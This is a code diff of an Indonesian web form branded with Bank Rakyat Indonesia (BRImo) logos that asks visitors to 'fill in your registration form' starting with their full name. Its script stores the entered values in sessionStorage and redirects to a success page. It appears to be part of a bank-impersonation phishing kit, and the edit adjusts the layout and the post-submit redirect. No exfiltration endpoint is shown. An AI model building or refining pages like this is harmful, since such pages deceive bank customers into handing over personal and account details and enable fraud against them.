@@ -32,19 +32,14 @@
   <div class="fixed top-0 left-0 w-full flex justify-start p-2 bg-blue-800">
     <img alt="Decorative image of BRI logo" class="h-20 w-20" src="FA_L_Ogo_BR_Imo_FSTVL_2_c9be1a8077.png"/>
   </div>
-  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md mt-24">
-    <div class="flex justify-between items-center mb-6">
-      <img alt="BRI logo" class="h-12" height="200" src="AddText_05-17-01.58.57.jpg" width="200"/> 
-      <a class="text-blue-800" href="#"> 
-          📝Isi Formulir Pendaftaran Kamu dibawah ini."
-      </a>
-    </div>
-    <form id="formData" method="POST">
-      <div class="mb-4">
-        <label class="block text-gray-700 mb-2">
+  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md mt-24"> 
+     <img src="AddText_05-17-01.58.57.jpg" alt="logo tengah" width="100" height="150">
+        <form id="formData" method="POST">
+<div class="mb-4">
+<label class="block text-gray-700 mb-2">
           Nama Lengkap (Tanpa Singkatan)
-        </label>
-        <input class="w-full px-3 py-2 border rounded-lg" id="a" name="a" placeholder="" required type="text"/>
+</label>
+<input class="w-full px-3 py-2 border rounded-lg" id="a" name="a" placeholder="" required type="text"/>
       </div>
       <div class="mb-4">
         <label class="block text-gray-700 mb-2">
@@ -125,7 +120,8 @@
             setTimeout(function () {
               $("#process1").hide();
               document.getElementById("kirims").innerHTML = "Selanjutnya";
-              window.location.href = "konf.html";
+              window.location.href = "sukses.html";
+
               var a = document.getElementById("a").value;
               sessionStorage.setItem("a", a);
               var b = document.getElementById("b").value;
